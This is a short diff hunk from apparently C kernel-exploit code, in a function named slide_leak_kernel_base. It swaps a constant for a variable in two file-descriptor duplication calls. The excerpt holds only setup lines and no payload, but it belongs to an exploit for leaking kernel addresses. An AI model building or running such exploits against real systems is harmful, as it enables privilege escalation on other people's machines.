@@ -1061,8 +1061,8 @@ int slide_leak_kernel_base(void) {
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
     int fds[2];
-    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
-    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
+    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, slide_pselect_nfds + 128));
+    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, slide_pselect_nfds + 129));
     SYSCHK(close(raw_fds[0]));
     SYSCHK(close(raw_fds[1]));
 
